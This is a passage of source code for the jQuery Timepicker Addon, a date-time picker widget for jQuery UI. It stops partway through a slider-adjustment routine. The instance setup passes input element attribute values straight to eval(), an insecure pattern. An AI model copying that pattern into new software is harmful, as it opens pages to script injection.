/*! jQuery Timepicker Addon - v1.6.3 - 2016-04-20
 * http://trentrichardson.com/examples/timepicker
 * Copyright (c) 2016 Trent Richardson; Licensed MIT */
( function ( factory ) {
	if ( typeof define === 'function' && define.amd ) {
		define( [ 'jquery', 'jquery-ui' ], factory );
	} else {
		factory( jQuery );
	}
} )( function ( $ ) {
	/*
	 * Lets not redefine timepicker, Prevent "Uncaught RangeError: Maximum call stack size exceeded"
	 */
	$.ui.timepicker = $.ui.timepicker || {};
	if ( $.ui.timepicker.version ) {
		return;
	}

	/*
	 * Extend jQueryUI, get it started with our version number
	 */
	$.extend( $.ui, {
		timepicker: {
			version: '1.6.3',
		},
	} );

	/*
	 * Timepicker manager.
	 * Use the singleton instance of this class, $.timepicker, to interact with the time picker.
	 * Settings for (groups of) time pickers are maintained in an instance object,
	 * allowing multiple different settings on the same page.
	 */
	var Timepicker = function () {
		this.regional = []; // Available regional settings, indexed by language code
		this.regional[ '' ] = {
			// Default regional settings
			currentText: 'Now',
			closeText: 'Done',
			amNames: [ 'AM', 'A' ],
			pmNames: [ 'PM', 'P' ],
			timeFormat: 'HH:mm',
			timeSuffix: '',
			timeOnlyTitle: 'Choose Time',
			timeText: 'Time',
			hourText: 'Hour',
			minuteText: 'Minute',
			secondText: 'Second',
			millisecText: 'Millisecond',
			microsecText: 'Microsecond',
			timezoneText: 'Time Zone',
			isRTL: false,
		};
		this._defaults = {
			// Global defaults for all the datetime picker instances
			showButtonPanel: true,
			timeOnly: false,
			timeOnlyShowDate: false,
			showHour: null,
			showMinute: null,
			showSecond: null,
			showMillisec: null,
			showMicrosec: null,
			showTimezone: null,
			showTime: true,
			stepHour: 1,
			stepMinute: 1,
			stepSecond: 1,
			stepMillisec: 1,
			stepMicrosec: 1,
			hour: 0,
			minute: 0,
			second: 0,
			millisec: 0,
			microsec: 0,
			timezone: null,
			hourMin: 0,
			minuteMin: 0,
			secondMin: 0,
			millisecMin: 0,
			microsecMin: 0,
			hourMax: 23,
			minuteMax: 59,
			secondMax: 59,
			millisecMax: 999,
			microsecMax: 999,
			minDateTime: null,
			maxDateTime: null,
			maxTime: null,
			minTime: null,
			onSelect: null,
			hourGrid: 0,
			minuteGrid: 0,
			secondGrid: 0,
			millisecGrid: 0,
			microsecGrid: 0,
			alwaysSetTime: true,
			separator: ' ',
			altFieldTimeOnly: true,
			altTimeFormat: null,
			altSeparator: null,
			altTimeSuffix: null,
			altRedirectFocus: true,
			pickerTimeFormat: null,
			pickerTimeSuffix: null,
			showTimepicker: true,
			timezoneList: null,
			addSliderAccess: false,
			sliderAccessArgs: null,
			controlType: 'slider',
			oneLine: false,
			defaultValue: null,
			parse: 'strict',
			afterInject: null,
		};
		$.extend( this._defaults, this.regional[ '' ] );
	};

	$.extend( Timepicker.prototype, {
		$input: null,
		$altInput: null,
		$timeObj: null,
		inst: null,
		hour_slider: null,
		minute_slider: null,
		second_slider: null,
		millisec_slider: null,
		microsec_slider: null,
		timezone_select: null,
		maxTime: null,
		minTime: null,
		hour: 0,
		minute: 0,
		second: 0,
		millisec: 0,
		microsec: 0,
		timezone: null,
		hourMinOriginal: null,
		minuteMinOriginal: null,
		secondMinOriginal: null,
		millisecMinOriginal: null,
		microsecMinOriginal: null,
		hourMaxOriginal: null,
		minuteMaxOriginal: null,
		secondMaxOriginal: null,
		millisecMaxOriginal: null,
		microsecMaxOriginal: null,
		ampm: '',
		formattedDate: '',
		formattedTime: '',
		formattedDateTime: '',
		timezoneList: null,
		units: [ 'hour', 'minute', 'second', 'millisec', 'microsec' ],
		support: {},
		control: null,

		/*
		 * Override the default settings for all instances of the time picker.
		 * @param  {Object} settings  object - the new settings to use as defaults (anonymous object)
		 * @return {Object} the manager object
		 */
		setDefaults: function ( settings ) {
			extendRemove( this._defaults, settings || {} );
			return this;
		},

		/*
		 * Create a new Timepicker instance
		 */
		_newInst: function ( $input, opts ) {
			var tp_inst = new Timepicker(),
				inlineSettings = {},
				fns = {},
				overrides,
				i;

			for ( var attrName in this._defaults ) {
				if ( this._defaults.hasOwnProperty( attrName ) ) {
					var attrValue = $input.attr( 'time:' + attrName );
					if ( attrValue ) {
						try {
							inlineSettings[ attrName ] = eval( attrValue );
						} catch ( err ) {
							inlineSettings[ attrName ] = attrValue;
						}
					}
				}
			}

			overrides = {
				beforeShow: function ( input, dp_inst ) {
					if ( $.isFunction( tp_inst._defaults.evnts.beforeShow ) ) {
						return tp_inst._defaults.evnts.beforeShow.call(
							$input[ 0 ],
							input,
							dp_inst,
							tp_inst
						);
					}
				},
				onChangeMonthYear: function ( year, month, dp_inst ) {
					// Update the time as well : this prevents the time from disappearing from the $input field.
					// tp_inst._updateDateTime(dp_inst);
					if (
						$.isFunction(
							tp_inst._defaults.evnts.onChangeMonthYear
						)
					) {
						tp_inst._defaults.evnts.onChangeMonthYear.call(
							$input[ 0 ],
							year,
							month,
							dp_inst,
							tp_inst
						);
					}
				},
				onClose: function ( dateText, dp_inst ) {
					if ( tp_inst.timeDefined === true && $input.val() !== '' ) {
						tp_inst._updateDateTime( dp_inst );
					}
					if ( $.isFunction( tp_inst._defaults.evnts.onClose ) ) {
						tp_inst._defaults.evnts.onClose.call(
							$input[ 0 ],
							dateText,
							dp_inst,
							tp_inst
						);
					}
				},
			};
			for ( i in overrides ) {
				if ( overrides.hasOwnProperty( i ) ) {
					fns[ i ] = opts[ i ] || this._defaults[ i ] || null;
				}
			}

			tp_inst._defaults = $.extend(
				{},
				this._defaults,
				inlineSettings,
				opts,
				overrides,
				{
					evnts: fns,
					timepicker: tp_inst, // add timepicker as a property of datepicker: $.datepicker._get(dp_inst, 'timepicker');
				}
			);
			tp_inst.amNames = $.map(
				tp_inst._defaults.amNames,
				function ( val ) {
					return val.toUpperCase();
				}
			);
			tp_inst.pmNames = $.map(
				tp_inst._defaults.pmNames,
				function ( val ) {
					return val.toUpperCase();
				}
			);

			// detect which units are supported
			tp_inst.support = detectSupport(
				tp_inst._defaults.timeFormat +
					( tp_inst._defaults.pickerTimeFormat
						? tp_inst._defaults.pickerTimeFormat
						: '' ) +
					( tp_inst._defaults.altTimeFormat
						? tp_inst._defaults.altTimeFormat
						: '' )
			);

			// controlType is string - key to our this._controls
			if ( typeof tp_inst._defaults.controlType === 'string' ) {
				if (
					tp_inst._defaults.controlType === 'slider' &&
					typeof $.ui.slider === 'undefined'
				) {
					tp_inst._defaults.controlType = 'select';
				}
				tp_inst.control =
					tp_inst._controls[ tp_inst._defaults.controlType ];
			}
			// controlType is an object and must implement create, options, value methods
			else {
				tp_inst.control = tp_inst._defaults.controlType;
			}

			// prep the timezone options
			var timezoneList = [
				-720,
				-660,
				-600,
				-570,
				-540,
				-480,
				-420,
				-360,
				-300,
				-270,
				-240,
				-210,
				-180,
				-120,
				-60,
				0,
				60,
				120,
				180,
				210,
				240,
				270,
				300,
				330,
				345,
				360,
				390,
				420,
				480,
				525,
				540,
				570,
				600,
				630,
				660,
				690,
				720,
				765,
				780,
				840,
			];
			if ( tp_inst._defaults.timezoneList !== null ) {
				timezoneList = tp_inst._defaults.timezoneList;
			}
			var tzl = timezoneList.length,
				tzi = 0,
				tzv = null;
			if ( tzl > 0 && typeof timezoneList[ 0 ] !== 'object' ) {
				for ( ; tzi < tzl; tzi++ ) {
					tzv = timezoneList[ tzi ];
					timezoneList[ tzi ] = {
						value: tzv,
						label: $.timepicker.timezoneOffsetString(
							tzv,
							tp_inst.support.iso8601
						),
					};
				}
			}
			tp_inst._defaults.timezoneList = timezoneList;

			// set the default units
			tp_inst.timezone =
				tp_inst._defaults.timezone !== null
					? $.timepicker.timezoneOffsetNumber(
							tp_inst._defaults.timezone
					  )
					: new Date().getTimezoneOffset() * -1;
			tp_inst.hour =
				tp_inst._defaults.hour < tp_inst._defaults.hourMin
					? tp_inst._defaults.hourMin
					: tp_inst._defaults.hour > tp_inst._defaults.hourMax
					? tp_inst._defaults.hourMax
					: tp_inst._defaults.hour;
			tp_inst.minute =
				tp_inst._defaults.minute < tp_inst._defaults.minuteMin
					? tp_inst._defaults.minuteMin
					: tp_inst._defaults.minute > tp_inst._defaults.minuteMax
					? tp_inst._defaults.minuteMax
					: tp_inst._defaults.minute;
			tp_inst.second =
				tp_inst._defaults.second < tp_inst._defaults.secondMin
					? tp_inst._defaults.secondMin
					: tp_inst._defaults.second > tp_inst._defaults.secondMax
					? tp_inst._defaults.secondMax
					: tp_inst._defaults.second;
			tp_inst.millisec =
				tp_inst._defaults.millisec < tp_inst._defaults.millisecMin
					? tp_inst._defaults.millisecMin
					: tp_inst._defaults.millisec > tp_inst._defaults.millisecMax
					? tp_inst._defaults.millisecMax
					: tp_inst._defaults.millisec;
			tp_inst.microsec =
				tp_inst._defaults.microsec < tp_inst._defaults.microsecMin
					? tp_inst._defaults.microsecMin
					: tp_inst._defaults.microsec > tp_inst._defaults.microsecMax
					? tp_inst._defaults.microsecMax
					: tp_inst._defaults.microsec;
			tp_inst.ampm = '';
			tp_inst.$input = $input;

			if ( tp_inst._defaults.altField ) {
				tp_inst.$altInput = $( tp_inst._defaults.altField );
				if ( tp_inst._defaults.altRedirectFocus === true ) {
					tp_inst.$altInput
						.css( {
							cursor: 'pointer',
						} )
						.focus( function () {
							$input.trigger( 'focus' );
						} );
				}
			}

			if (
				tp_inst._defaults.minDate === 0 ||
				tp_inst._defaults.minDateTime === 0
			) {
				tp_inst._defaults.minDate = new Date();
			}
			if (
				tp_inst._defaults.maxDate === 0 ||
				tp_inst._defaults.maxDateTime === 0
			) {
				tp_inst._defaults.maxDate = new Date();
			}

			// datepicker needs minDate/maxDate, timepicker needs minDateTime/maxDateTime..
			if (
				tp_inst._defaults.minDate !== undefined &&
				tp_inst._defaults.minDate instanceof Date
			) {
				tp_inst._defaults.minDateTime = new Date(
					tp_inst._defaults.minDate.getTime()
				);
			}
			if (
				tp_inst._defaults.minDateTime !== undefined &&
				tp_inst._defaults.minDateTime instanceof Date
			) {
				tp_inst._defaults.minDate = new Date(
					tp_inst._defaults.minDateTime.getTime()
				);
			}
			if (
				tp_inst._defaults.maxDate !== undefined &&
				tp_inst._defaults.maxDate instanceof Date
			) {
				tp_inst._defaults.maxDateTime = new Date(
					tp_inst._defaults.maxDate.getTime()
				);
			}
			if (
				tp_inst._defaults.maxDateTime !== undefined &&
				tp_inst._defaults.maxDateTime instanceof Date
			) {
				tp_inst._defaults.maxDate = new Date(
					tp_inst._defaults.maxDateTime.getTime()
				);
			}
			tp_inst.$input.bind( 'focus', function () {
				tp_inst._onFocus();
			} );

			return tp_inst;
		},

		/*
		 * add our sliders to the calendar
		 */
		_addTimePicker: function ( dp_inst ) {
			var currDT = $.trim(
				this.$altInput && this._defaults.altFieldTimeOnly
					? this.$input.val() + ' ' + this.$altInput.val()
					: this.$input.val()
			);

			this.timeDefined = this._parseTime( currDT );
			this._limitMinMaxDateTime( dp_inst, false );
			this._injectTimePicker();
			this._afterInject();
		},

		/*
		 * parse the time string from input value or _setTime
		 */
		_parseTime: function ( timeString, withDate ) {
			if ( ! this.inst ) {
				this.inst = $.datepicker._getInst( this.$input[ 0 ] );
			}

			if ( withDate || ! this._defaults.timeOnly ) {
				var dp_dateFormat = $.datepicker._get(
					this.inst,
					'dateFormat'
				);
				try {
					var parseRes = parseDateTimeInternal(
						dp_dateFormat,
						this._defaults.timeFormat,
						timeString,
						$.datepicker._getFormatConfig( this.inst ),
						this._defaults
					);
					if ( ! parseRes.timeObj ) {
						return false;
					}
					$.extend( this, parseRes.timeObj );
				} catch ( err ) {
					$.timepicker.log(
						'Error parsing the date/time string: ' +
							err +
							'\ndate/time string = ' +
							timeString +
							'\ntimeFormat = ' +
							this._defaults.timeFormat +
							'\ndateFormat = ' +
							dp_dateFormat
					);
					return false;
				}
				return true;
			} else {
				var timeObj = $.datepicker.parseTime(
					this._defaults.timeFormat,
					timeString,
					this._defaults
				);
				if ( ! timeObj ) {
					return false;
				}
				$.extend( this, timeObj );
				return true;
			}
		},

		/*
		 * Handle callback option after injecting timepicker
		 */
		_afterInject: function () {
			var o = this.inst.settings;
			if ( $.isFunction( o.afterInject ) ) {
				o.afterInject.call( this );
			}
		},

		/*
		 * generate and inject html for timepicker into ui datepicker
		 */
		_injectTimePicker: function () {
			var $dp = this.inst.dpDiv,
				o = this.inst.settings,
				tp_inst = this,
				litem = '',
				uitem = '',
				show = null,
				max = {},
				gridSize = {},
				size = null,
				i = 0,
				l = 0;

			// Prevent displaying twice
			if (
				$dp.find( 'div.ui-timepicker-div' ).length === 0 &&
				o.showTimepicker
			) {
				var noDisplay = ' ui_tpicker_unit_hide',
					html =
						'<div class="ui-timepicker-div' +
						( o.isRTL ? ' ui-timepicker-rtl' : '' ) +
						( o.oneLine && o.controlType === 'select'
							? ' ui-timepicker-oneLine'
							: '' ) +
						'"><dl>' +
						'<dt class="ui_tpicker_time_label' +
						( o.showTime ? '' : noDisplay ) +
						'">' +
						o.timeText +
						'</dt>' +
						'<dd class="ui_tpicker_time ' +
						( o.showTime ? '' : noDisplay ) +
						'"><input class="ui_tpicker_time_input" ' +
						( o.timeInput ? '' : 'disabled' ) +
						'/></dd>';

				// Create the markup
				for ( i = 0, l = this.units.length; i < l; i++ ) {
					litem = this.units[ i ];
					uitem =
						litem.substr( 0, 1 ).toUpperCase() + litem.substr( 1 );
					show =
						o[ 'show' + uitem ] !== null
							? o[ 'show' + uitem ]
							: this.support[ litem ];

					// Added by Peter Medeiros:
					// - Figure out what the hour/minute/second max should be based on the step values.
					// - Example: if stepMinute is 15, then minMax is 45.
					max[ litem ] = parseInt(
						o[ litem + 'Max' ] -
							( ( o[ litem + 'Max' ] - o[ litem + 'Min' ] ) %
								o[ 'step' + uitem ] ),
						10
					);
					gridSize[ litem ] = 0;

					html +=
						'<dt class="ui_tpicker_' +
						litem +
						'_label' +
						( show ? '' : noDisplay ) +
						'">' +
						o[ litem + 'Text' ] +
						'</dt>' +
						'<dd class="ui_tpicker_' +
						litem +
						( show ? '' : noDisplay ) +
						'"><div class="ui_tpicker_' +
						litem +
						'_slider' +
						( show ? '' : noDisplay ) +
						'"></div>';

					if ( show && o[ litem + 'Grid' ] > 0 ) {
						html +=
							'<div style="padding-left: 1px"><table class="ui-tpicker-grid-label"><tr>';

						if ( litem === 'hour' ) {
							for (
								var h = o[ litem + 'Min' ];
								h <= max[ litem ];
								h += parseInt( o[ litem + 'Grid' ], 10 )
							) {
								gridSize[ litem ]++;
								var tmph = $.datepicker.formatTime(
									this.support.ampm ? 'hht' : 'HH',
									{ hour: h },
									o
								);
								html +=
									'<td data-for="' +
									litem +
									'">' +
									tmph +
									'</td>';
							}
						} else {
							for (
								var m = o[ litem + 'Min' ];
								m <= max[ litem ];
								m += parseInt( o[ litem + 'Grid' ], 10 )
							) {
								gridSize[ litem ]++;
								html +=
									'<td data-for="' +
									litem +
									'">' +
									( m < 10 ? '0' : '' ) +
									m +
									'</td>';
							}
						}

						html += '</tr></table></div>';
					}
					html += '</dd>';
				}

				// Timezone
				var showTz =
					o.showTimezone !== null
						? o.showTimezone
						: this.support.timezone;
				html +=
					'<dt class="ui_tpicker_timezone_label' +
					( showTz ? '' : noDisplay ) +
					'">' +
					o.timezoneText +
					'</dt>';
				html +=
					'<dd class="ui_tpicker_timezone' +
					( showTz ? '' : noDisplay ) +
					'"></dd>';

				// Create the elements from string
				html += '</dl></div>';
				var $tp = $( html );

				// if we only want time picker...
				if ( o.timeOnly === true ) {
					$tp.prepend(
						'<div class="ui-widget-header ui-helper-clearfix ui-corner-all">' +
							'<div class="ui-datepicker-title">' +
							o.timeOnlyTitle +
							'</div>' +
							'</div>'
					);
					$dp.find(
						'.ui-datepicker-header, .ui-datepicker-calendar'
					).hide();
				}

				// add sliders, adjust grids, add events
				for ( i = 0, l = tp_inst.units.length; i < l; i++ ) {
					litem = tp_inst.units[ i ];
					uitem =
						litem.substr( 0, 1 ).toUpperCase() + litem.substr( 1 );
					show =
						o[ 'show' + uitem ] !== null
							? o[ 'show' + uitem ]
							: this.support[ litem ];

					// add the slider
					tp_inst[ litem + '_slider' ] = tp_inst.control.create(
						tp_inst,
						$tp.find( '.ui_tpicker_' + litem + '_slider' ),
						litem,
						tp_inst[ litem ],
						o[ litem + 'Min' ],
						max[ litem ],
						o[ 'step' + uitem ]
					);

					// adjust the grid and add click event
					if ( show && o[ litem + 'Grid' ] > 0 ) {
						size =
							( 100 * gridSize[ litem ] * o[ litem + 'Grid' ] ) /
							( max[ litem ] - o[ litem + 'Min' ] );
						$tp.find( '.ui_tpicker_' + litem + ' table' )
							.css( {
								width: size + '%',
								marginLeft: o.isRTL
									? '0'
									: size / ( -2 * gridSize[ litem ] ) + '%',
								marginRight: o.isRTL
									? size / ( -2 * gridSize[ litem ] ) + '%'
									: '0',
								borderCollapse: 'collapse',
							} )
							.find( 'td' )
							.click( function ( e ) {
								var $t = $( this ),
									h = $t.html(),
									n = parseInt( h.replace( /[^0-9]/g ), 10 ),
									ap = h.replace( /[^apm]/gi ),
									f = $t.data( 'for' ); // loses scope, so we use data-for

								if ( f === 'hour' ) {
									if ( ap.indexOf( 'p' ) !== -1 && n < 12 ) {
										n += 12;
									} else {
										if (
											ap.indexOf( 'a' ) !== -1 &&
											n === 12
										) {
											n = 0;
										}
									}
								}

								tp_inst.control.value(
									tp_inst,
									tp_inst[ f + '_slider' ],
									litem,
									n
								);

								tp_inst._onTimeChange();
								tp_inst._onSelectHandler();
							} )
							.css( {
								cursor: 'pointer',
								width: 100 / gridSize[ litem ] + '%',
								textAlign: 'center',
								overflow: 'hidden',
							} );
					} // end if grid > 0
				} // end for loop

				// Add timezone options
				this.timezone_select = $tp
					.find( '.ui_tpicker_timezone' )
					.append( '<select></select>' )
					.find( 'select' );
				$.fn.append.apply(
					this.timezone_select,
					$.map( o.timezoneList, function ( val, idx ) {
						return $( '<option />' )
							.val( typeof val === 'object' ? val.value : val )
							.text( typeof val === 'object' ? val.label : val );
					} )
				);
				if (
					typeof this.timezone !== 'undefined' &&
					this.timezone !== null &&
					this.timezone !== ''
				) {
					var local_timezone =
						new Date(
							this.inst.selectedYear,
							this.inst.selectedMonth,
							this.inst.selectedDay,
							12
						).getTimezoneOffset() * -1;
					if ( local_timezone === this.timezone ) {
						selectLocalTimezone( tp_inst );
					} else {
						this.timezone_select.val( this.timezone );
					}
				} else {
					if (
						typeof this.hour !== 'undefined' &&
						this.hour !== null &&
						this.hour !== ''
					) {
						this.timezone_select.val( o.timezone );
					} else {
						selectLocalTimezone( tp_inst );
					}
				}
				this.timezone_select.change( function () {
					tp_inst._onTimeChange();
					tp_inst._onSelectHandler();
					tp_inst._afterInject();
				} );
				// End timezone options

				// inject timepicker into datepicker
				var $buttonPanel = $dp.find( '.ui-datepicker-buttonpane' );
				if ( $buttonPanel.length ) {
					$buttonPanel.before( $tp );
				} else {
					$dp.append( $tp );
				}

				this.$timeObj = $tp.find( '.ui_tpicker_time_input' );
				this.$timeObj.change( function () {
					var timeFormat = tp_inst.inst.settings.timeFormat;
					var parsedTime = $.datepicker.parseTime(
						timeFormat,
						this.value
					);
					var update = new Date();
					if ( parsedTime ) {
						update.setHours( parsedTime.hour );
						update.setMinutes( parsedTime.minute );
						update.setSeconds( parsedTime.second );
						$.datepicker._setTime( tp_inst.inst, update );
					} else {
						this.value = tp_inst.formattedTime;
						this.blur();
					}
				} );

				if ( this.inst !== null ) {
					var timeDefined = this.timeDefined;
					this._onTimeChange();
					this.timeDefined = timeDefined;
				}

				// slideAccess integration: http://trentrichardson.com/2011/11/11/jquery-ui-sliders-and-touch-accessibility/
				if ( this._defaults.addSliderAccess ) {
					var sliderAccessArgs = this._defaults.sliderAccessArgs,
						rtl = this._defaults.isRTL;
					sliderAccessArgs.isRTL = rtl;

					setTimeout( function () {
						// fix for inline mode
						if ( $tp.find( '.ui-slider-access' ).length === 0 ) {
							$tp.find( '.ui-slider:visible' ).sliderAccess(
								sliderAccessArgs
							);

							// fix any grids since sliders are shorter
							var sliderAccessWidth = $tp
								.find( '.ui-slider-access:eq(0)' )
								.outerWidth( true );
							if ( sliderAccessWidth ) {
								$tp.find( 'table:visible' ).each( function () {
									var $g = $( this ),
										oldWidth = $g.outerWidth(),
										oldMarginLeft = $g
											.css(
												rtl
													? 'marginRight'
													: 'marginLeft'
											)
											.toString()
											.replace( '%', '' ),
										newWidth = oldWidth - sliderAccessWidth,
										newMarginLeft =
											( oldMarginLeft * newWidth ) /
												oldWidth +
											'%',
										css = {
											width: newWidth,
											marginRight: 0,
											marginLeft: 0,
										};
									css[
										rtl ? 'marginRight' : 'marginLeft'
									] = newMarginLeft;
									$g.css( css );
								} );
							}
						}
					}, 10 );
				}
				// end slideAccess integration

				tp_inst._limitMinMaxDateTime( this.inst, true );
			}
		},

		/*
		 * This function tries to limit the ability to go outside the
		 * min/max date range
		 */
		_limitMinMaxDateTime: function ( dp_inst, adjustSliders ) {
			var o = this._defaults,
				dp_date = new Date(
					dp_inst.selectedYear,
					dp_inst.selectedMonth,
					dp_inst.selectedDay
				);

			if ( ! this._defaults.showTimepicker ) {
				return;
			} // No time so nothing to check here

			if (
				$.datepicker._get( dp_inst, 'minDateTime' ) !== null &&
				$.datepicker._get( dp_inst, 'minDateTime' ) !== undefined &&
				dp_date
			) {
				var minDateTime = $.datepicker._get( dp_inst, 'minDateTime' ),
					minDateTimeDate = new Date(
						minDateTime.getFullYear(),
						minDateTime.getMonth(),
						minDateTime.getDate(),
						0,
						0,
						0,
						0
					);

				if (
					this.hourMinOriginal === null ||
					this.minuteMinOriginal === null ||
					this.secondMinOriginal === null ||
					this.millisecMinOriginal === null ||
					this.microsecMinOriginal === null
				) {
					this.hourMinOriginal = o.hourMin;
					this.minuteMinOriginal = o.minuteMin;
					this.secondMinOriginal = o.secondMin;
					this.millisecMinOriginal = o.millisecMin;
					this.microsecMinOriginal = o.microsecMin;
				}

				if (
					dp_inst.settings.timeOnly ||
					minDateTimeDate.getTime() === dp_date.getTime()
				) {
					this._defaults.hourMin = minDateTime.getHours();
					if ( this.hour <= this._defaults.hourMin ) {
						this.hour = this._defaults.hourMin;
						this._defaults.minuteMin = minDateTime.getMinutes();
						if ( this.minute <= this._defaults.minuteMin ) {
							this.minute = this._defaults.minuteMin;
							this._defaults.secondMin = minDateTime.getSeconds();
							if ( this.second <= this._defaults.secondMin ) {
								this.second = this._defaults.secondMin;
								this._defaults.millisecMin = minDateTime.getMilliseconds();
								if (
									this.millisec <= this._defaults.millisecMin
								) {
									this.millisec = this._defaults.millisecMin;
									this._defaults.microsecMin = minDateTime.getMicroseconds();
								} else {
									if (
										this.microsec <
										this._defaults.microsecMin
									) {
										this.microsec = this._defaults.microsecMin;
									}
									this._defaults.microsecMin = this.microsecMinOriginal;
								}
							} else {
								this._defaults.millisecMin = this.millisecMinOriginal;
								this._defaults.microsecMin = this.microsecMinOriginal;
							}
						} else {
							this._defaults.secondMin = this.secondMinOriginal;
							this._defaults.millisecMin = this.millisecMinOriginal;
							this._defaults.microsecMin = this.microsecMinOriginal;
						}
					} else {
						this._defaults.minuteMin = this.minuteMinOriginal;
						this._defaults.secondMin = this.secondMinOriginal;
						this._defaults.millisecMin = this.millisecMinOriginal;
						this._defaults.microsecMin = this.microsecMinOriginal;
					}
				} else {
					this._defaults.hourMin = this.hourMinOriginal;
					this._defaults.minuteMin = this.minuteMinOriginal;
					this._defaults.secondMin = this.secondMinOriginal;
					this._defaults.millisecMin = this.millisecMinOriginal;
					this._defaults.microsecMin = this.microsecMinOriginal;
				}
			}

			if (
				$.datepicker._get( dp_inst, 'maxDateTime' ) !== null &&
				$.datepicker._get( dp_inst, 'maxDateTime' ) !== undefined &&
				dp_date
			) {
				var maxDateTime = $.datepicker._get( dp_inst, 'maxDateTime' ),
					maxDateTimeDate = new Date(
						maxDateTime.getFullYear(),
						maxDateTime.getMonth(),
						maxDateTime.getDate(),
						0,
						0,
						0,
						0
					);

				if (
					this.hourMaxOriginal === null ||
					this.minuteMaxOriginal === null ||
					this.secondMaxOriginal === null ||
					this.millisecMaxOriginal === null
				) {
					this.hourMaxOriginal = o.hourMax;
					this.minuteMaxOriginal = o.minuteMax;
					this.secondMaxOriginal = o.secondMax;
					this.millisecMaxOriginal = o.millisecMax;
					this.microsecMaxOriginal = o.microsecMax;
				}

				if (
					dp_inst.settings.timeOnly ||
					maxDateTimeDate.getTime() === dp_date.getTime()
				) {
					this._defaults.hourMax = maxDateTime.getHours();
					if ( this.hour >= this._defaults.hourMax ) {
						this.hour = this._defaults.hourMax;
						this._defaults.minuteMax = maxDateTime.getMinutes();
						if ( this.minute >= this._defaults.minuteMax ) {
							this.minute = this._defaults.minuteMax;
							this._defaults.secondMax = maxDateTime.getSeconds();
							if ( this.second >= this._defaults.secondMax ) {
								this.second = this._defaults.secondMax;
								this._defaults.millisecMax = maxDateTime.getMilliseconds();
								if (
									this.millisec >= this._defaults.millisecMax
								) {
									this.millisec = this._defaults.millisecMax;
									this._defaults.microsecMax = maxDateTime.getMicroseconds();
								} else {
									if (
										this.microsec >
										this._defaults.microsecMax
									) {
										this.microsec = this._defaults.microsecMax;
									}
									this._defaults.microsecMax = this.microsecMaxOriginal;
								}
							} else {
								this._defaults.millisecMax = this.millisecMaxOriginal;
								this._defaults.microsecMax = this.microsecMaxOriginal;
							}
						} else {
							this._defaults.secondMax = this.secondMaxOriginal;
							this._defaults.millisecMax = this.millisecMaxOriginal;
							this._defaults.microsecMax = this.microsecMaxOriginal;
						}
					} else {
						this._defaults.minuteMax = this.minuteMaxOriginal;
						this._defaults.secondMax = this.secondMaxOriginal;
						this._defaults.millisecMax = this.millisecMaxOriginal;
						this._defaults.microsecMax = this.microsecMaxOriginal;
					}
				} else {
					this._defaults.hourMax = this.hourMaxOriginal;
					this._defaults.minuteMax = this.minuteMaxOriginal;
					this._defaults.secondMax = this.secondMaxOriginal;
					this._defaults.millisecMax = this.millisecMaxOriginal;
					this._defaults.microsecMax = this.microsecMaxOriginal;
				}
			}

			if ( dp_inst.settings.minTime !== null ) {
				var tempMinTime = new Date(
					'01/01/1970 ' + dp_inst.settings.minTime
				);
				if ( this.hour < tempMinTime.getHours() ) {
					this.hour = this._defaults.hourMin = tempMinTime.getHours();
					this.minute = this._defaults.minuteMin = tempMinTime.getMinutes();
				} else if (
					this.hour === tempMinTime.getHours() &&
					this.minute < tempMinTime.getMinutes()
				) {
					this.minute = this._defaults.minuteMin = tempMinTime.getMinutes();
				} else {
					if ( this._defaults.hourMin < tempMinTime.getHours() ) {
						this._defaults.hourMin = tempMinTime.getHours();
						this._defaults.minuteMin = tempMinTime.getMinutes();
					} else if (
						( this._defaults.hourMin ===
							tempMinTime.getHours() ) ===
							this.hour &&
						this._defaults.minuteMin < tempMinTime.getMinutes()
					) {
						this._defaults.minuteMin = tempMinTime.getMinutes();
					} else {
						this._defaults.minuteMin = 0;
					}
				}
			}

			if ( dp_inst.settings.maxTime !== null ) {
				var tempMaxTime = new Date(
					'01/01/1970 ' + dp_inst.settings.maxTime
				);
				if ( this.hour > tempMaxTime.getHours() ) {
					this.hour = this._defaults.hourMax = tempMaxTime.getHours();
					this.minute = this._defaults.minuteMax = tempMaxTime.getMinutes();
				} else if (
					this.hour === tempMaxTime.getHours() &&
					this.minute > tempMaxTime.getMinutes()
				) {
					this.minute = this._defaults.minuteMax = tempMaxTime.getMinutes();
				} else {
					if ( this._defaults.hourMax > tempMaxTime.getHours() ) {
						this._defaults.hourMax = tempMaxTime.getHours();
						this._defaults.minuteMax = tempMaxTime.getMinutes();
					} else if (
						( this._defaults.hourMax ===
							tempMaxTime.getHours() ) ===
							this.hour &&
						this._defaults.minuteMax > tempMaxTime.getMinutes()
					) {
						this._defaults.minuteMax = tempMaxTime.getMinutes();
					} else {
						this._defaults.minuteMax = 59;
					}
				}
			}

			if ( adjustSliders !== undefined && adjustSliders === true ) {
				var hourMax = parseInt(
						this._defaults.hourMax -
							( ( this._defaults.hourMax -
								this._defaults.hourMin ) %
								this._defaults.stepHour ),
						10
					),
					minMax = parseInt(
						this._defaults.minuteMax -
							( ( this._defaults.minuteMax -
								this._defaults.minuteMin ) %
								this._defaults.stepMinute ),
						10
					),
					secMax = parseInt(
						this._defaults.secondMax -
							( ( this._defaults.secondMax -
								this._defaults.secondMin ) %
								this._defaults.stepSecond ),
						10
					),
					millisecMax = parseInt(
						this._defaults.millisecMax -
							( ( this._defaults.millisecMax -
								this._defaults.millisecMin ) %
								this._defaults.stepMillisec ),
						10
					),
					microsecMax = parseInt(
						this._defaults.microsecMax -
							( ( this._defaults.microsecMax -
								this._defaults.microsecMin ) %
								this._defaults.stepMicrosec ),
						10
					);

				if ( this.hour_slider ) {
					this.control.options( this, this.hour_slider, 'hour', {
						min: this._defaults.hourMin,
						max: hourMax,
						step: this._defaults.stepHour,
					} );
					this.control.value(
						this,
						this.hour_slider,
						'hour',
						this.hour - ( this.hour % this._defaults.stepHour )
					);
				}
				if ( this.minute_slider ) {
					this.control.options( this, this.minute_slider, 'minute', {
						min: this._defaults.minuteMin,
						max: minMax,
						step: this._defaults.stepMinute,
					} );
					this.control.value(
						this,
						this.minute_slider,
						'minute',
						this.minute -
							( this.minute % this._defaults.stepMinute )
					);
				}
				if ( this.second_slider ) {
					this.control.options( this, this.second_slider, 'second', {
						min: this._defaults.secondMin,
						max: secMax,
						step: this._defaults.stepSecond,
					} );
					this.control.value(
						this,
						this.second_slider,
						'second',
						this.second -
							( this.second % this._defaults.stepSecond )
					);
				}
				if ( this.millisec_slider ) {
					this.control.options(
						this,
						this.millisec_slider,
						'millisec',
						{
							min: this._defaults.millisecMin,
							max: millisecMax,
							step: this._defaults.stepMillisec,
						}
					);
					this.control.value(
						this,
						this.millisec_slider,
